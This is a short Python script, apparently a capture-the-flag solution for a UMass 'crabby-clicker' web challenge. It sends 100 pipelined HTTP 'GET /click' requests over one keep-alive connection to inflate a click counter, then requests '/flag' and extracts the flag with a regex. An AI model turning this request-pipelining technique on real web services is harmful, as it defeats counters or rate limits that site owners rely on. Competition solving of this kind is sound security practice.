#!/usr/bin/env python3
from pwn import *
import re

URL = 'crabby-clicker.ctf.umasscybersec.org'
REGEX = r'UMASS\{.*\}'
PAYLOAD = (
b"GET /click HTTP/1.1\r\n"
b"Host: " + URL.encode() +
b"\rConnection: keep-alive\r\n\r\n"
) * 100 + b'GET /flag HTTP/1.1\r\nHost: ' + URL.encode() + b'\r\n\r\n'

s = remote(URL, 80)
s.send(PAYLOAD)
resp = s.recvuntil(b'}').decode()
print(re.findall(REGEX, resp)[0])